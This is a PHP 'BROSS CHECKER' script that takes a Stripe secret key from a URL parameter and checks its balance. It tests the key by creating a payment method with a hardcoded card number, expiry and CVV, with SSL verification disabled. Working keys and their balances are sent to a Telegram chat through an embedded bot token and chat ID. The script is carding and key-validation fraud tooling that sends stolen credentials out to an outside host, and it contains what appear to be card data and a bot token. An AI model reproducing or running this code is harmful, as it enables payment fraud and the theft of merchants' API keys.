<?php

//===================== [ BROSS CHECKER ] ====================//

//================ [ FUNCTIONS & LISTA ] 

function getstr($string, $start, $end, $index) {
  $str = explode($start, $string);
  if (count($str) > $index + 1) {
    $str = explode($end, $str[$index + 1]);
    return $str[0];
  } else {
    return "";
  }
}
$cc = '4966234351444384';
$mes = '10';
$ano = '29';
$cvv = '643';
$skgate = $_GET['lista'];
$chatID = -1001845357353;
$token = "5856648236:AAEBqiJuFjG-17019DLpRBRi3NozM4kyJnQ";
//================= [ CURL REQUESTS ] =================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/balance");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_USERPWD, "$skgate:");

// Execute the request and store the result
$result = curl_exec($ch);
////echo "result: $result\n";

$available_string = getstr($result, '"amount": ', ',', 0);
$msg = getstr($result, '"message": "', '"', 0);
$currency = getstr($result, '"currency": "', '"', 0);
$pending_string = getstr($result, '"amount": ', ',', 2);

$available = (int) $available_string;
$pending = (int) $pending_string;

if (strpos($result, 'error') !== false){
  echo '<span style="color:red">========================================<br>DEAD=`'.$skgate.'`<br>['.$msg.']</span><br>';
}
elseif (strpos($result, '"object"') !== false) {
  echo '<span style="color:Aqua">========================================<br>◈SK_LIVE=`'.$skgate.'`<br>Available balance ='.$available.'<br>Pending balance ='.$pending.'<br>currency ='.$currency.'</span><br>';
  //////////////=======[CHK LIVE SK]===========/////////
$rate_limit_not_reached = false;
while (!$rate_limit_not_reached) {
$sendtestmode = false;
$sendlive = false;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $skgate. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'');
$result1 = curl_exec($ch);
$resp1 = getstr($result1,'"code": "','"', 0);
$msg = getstr($result1, '"message": "', '"', 0);
///echo "<br><b>Result1: </b> $result1<br>";
/////////////////=========[RESULTS]=========/////////////
if (strpos($result1, '"rate_limit"') || strpos($result1, '"processing_error"')) {
    $rate_limit_not_reached = false;
}
elseif (strpos($result1, '"testmode_charges_only"') || strpos($result1, '"api_key_expired"') || strpos($result1, '"processing_error"') || strpos($result1, '"processing_error"') || strpos($result1, 'Invalid API Key provided')) {
    $rate_limit_not_reached = true;
        echo '<span style="color:red">DEAD=[Result= '.$resp1.']</span><br>';
        break;
}
elseif (strpos($result1, '"The API key provided does not allow requests from your IP address."')) {
    $sendtestmode = true;
    $rate_limit_not_reached = true;
       echo '<span style="color:red">CVV=[Result= '.$msg.']</span><br>';
}
else{
  echo '<span style="color:Aqua">◈LIVE_SK';
  $sendlive = true;
  //////////////////////
  break;
}
}
}
$result1 = getResult();
//////////////////////================[TELEGRAM BOT]====================/////////////////////////////////////////
$LIVEMessage1 = urlencode("◈testmode_charges_SK:`$skgate`\nAvailable balance =$available\nPending balance =$pending\ncurrency =$currency\n[Result=$resp1][$msg]");
$LIVEMessage2 = urlencode("◈LIVE_SK:`$skgate`\nAvailable balance =$available\nPending balance =$pending\ncurrency =$currency\n[Result=◈LIVE_SK]");
if ($sendtestmode === true) {
    $apiUrl = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatID&text=$LIVEMessage1";
    $response = file_get_contents($apiUrl);
}
elseif ($sendlive === true) {
    $apiUrl = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatID&text=$LIVEMessage2";
    $response = file_get_contents($apiUrl);
}
function getResult() {
    // Perform the request and return the result
    // Replace this with your actual code to get the result
    return "This is a test result";
}
?>